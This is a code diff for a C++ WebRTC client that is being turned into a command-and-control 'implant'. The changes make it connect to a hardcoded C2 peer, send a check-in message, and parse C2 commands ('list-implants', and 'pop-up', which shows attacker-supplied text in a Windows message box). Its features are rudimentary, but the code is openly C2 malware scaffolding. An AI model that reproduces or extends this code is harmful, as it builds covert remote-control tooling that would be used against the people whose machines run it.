@@ -36,6 +36,9 @@
 #include <thread>
 #include <unordered_map>
 
+#include <windows.h>
+
+
 using namespace rtc;
 using namespace std;
 using namespace std::chrono_literals;
@@ -53,11 +56,45 @@ shared_ptr<PeerConnection> createPeerConnection(const Configuration &config,
                                                 weak_ptr<WebSocket> wws, string id);
 string randomId(size_t length);
 
+
+/***
+* Interprets messages from the C2 (Verify, Decrypt, Process)
+***/
+
+int parseMessage(string message) {
+
+	//Commands
+	string cmd1 = "list-implants";
+	string cmd2 = "pop-up";
+
+
+	/***
+	* list-implants - List the implants connected on the network.
+	***/
+	if (strncmp(message.c_str(), cmd1.c_str(), cmd1.size()) == 0) {
+	
+		string data = message.substr(message.find(":") + 1); //Get Data from command
+		//TODO: Update arrays and save on to disk
+
+
+	/***
+	* pop-up - Pop a message box with the give message
+	***/
+	}else if(strncmp(message.c_str(), cmd2.c_str(), cmd2.size()) == 0) {
+		string data = message.substr(message.find(":") + 1); 
+		int msgboxID = MessageBox(NULL,data.c_str(),"Important Message",MB_ICONWARNING | MB_CANCELTRYCONTINUE | MB_DEFBUTTON2);
+
+	}else
+		cout << message << endl;
+
+
+	return 1;
+}
+
 int main(int argc, char **argv) try {
 	Cmdline params(argc, argv);
 
 	rtc::InitLogger(LogLevel::Info);
-	cout << "we good" << endl;
 	Configuration config;
 	//stunServer hardcodes
 	string stunServer = "stun:stun.l.google.com:19302";		
@@ -124,7 +161,6 @@ int main(int argc, char **argv) try {
 		}
 	});
 
-	
 	//craft signal server w/ local id from hardcoded signal server
 	const string url = signalServed + "/" + localId;
 	ws->open(url);
@@ -132,10 +168,15 @@ int main(int argc, char **argv) try {
 	//waiting for signal connection
 	wsFuture.get();
 
-	//once we reach here, we are connected and live
+	/***
+	* Implant check-in
+	***/
+
 	while (true) {
+
+
 		string id;
-		cout << "Enter a remote ID to send an offer:" << endl;
+		cout << "Press ENTER to Connect" << endl; //TODO - Remove this in the future
 		cin >> id;
 		cin.ignore();
 		if (id.empty())
@@ -143,49 +184,39 @@ int main(int argc, char **argv) try {
 		if (id == localId)
 			continue;
 
-		cout << "Offering to " + id << endl;
-		auto pc = createPeerConnection(config, ws, id);
+		//Create Connection
+		auto pc = createPeerConnection(config, ws, c2id);
 
-		//offering to c2
-		auto pc2 = createPeerConnection(config, ws, c2id);
-
-		// We are the offerer, so create a data channel to initiate the process
-		const string label = "test";
-
-		cout << "Creating DataChannel with label \"" << label << "\"" << endl;
+		//Create a data channel to initiate the process
+		const string label = "c2-main";
 		auto dc = pc->createDataChannel(label);
 
-		//create c2 connection
-		const string c2dclabel = "sixtynine";
-		auto dc2 = pc2->createDataChannel(c2dclabel);
-
-		dc->onOpen([id, wdc = make_weak_ptr(dc)]() {
-			cout << "DataChannel from " << id << " open" << endl;
-			if (auto dc = wdc.lock())
-				dc->send("Hello from " + localId);
+		//Create C2 Connection
+		dc->onOpen([c2id, wdc = make_weak_ptr(dc)]() {
+			cout << "DataChannel from " << c2id << " open" << endl;
+			if (auto dc = wdc.lock()){
+				dc->send("check-in " + localId); //Checks In with C2
+			}
 		});
 		
-		//on open to c2
-		dc2->onOpen([c2id, wdc = make_weak_ptr(dc2)]() {
-			cout << "DataChannel from " << c2id << " open" << endl;
-			if (auto dc2 = wdc.lock())
-				dc2->send("Hello from " + localId);
-		});
 
-		dc->onClosed([id]() { cout << "DataChannel from " << id << " closed" << endl; });
 
-		//given c2 closed
-		dc2->onClosed([c2id]() { cout << "DataChannel from " << c2id << " closed" << endl; });
+		dc->onClosed([c2id]() { cout << "DataChannel from " << c2id << " closed" << endl; });
 
-		dc->onMessage([id, wdc = make_weak_ptr(dc)](variant<binary, string> data) {
-			if (holds_alternative<string>(data))
-				cout << "Message from " << id << " received: " << get<string>(data) << endl;
+		//On received Message
+		dc->onMessage([c2id, wdc = make_weak_ptr(dc)](variant<binary, string> data) {
+			if (holds_alternative<string>(data)){
+
+				//Interpret Messages (Verify, Decrypt, Interpret) 
+				cout << "CONSUMING.." << endl;
+				parseMessage(get<string>(data));
+
+			}
 			else
-				cout << "Binary message from " << id
-				     << " received, size=" << get<binary>(data).size() << endl;
+				cout << "Binary message from C2 received, size=" << get<binary>(data).size() << endl;
 		});
 
-		dataChannelMap.emplace(id, dc);
+		dataChannelMap.emplace(c2id, dc);
 	}
 
 	cout << "Cleaning up..." << endl;
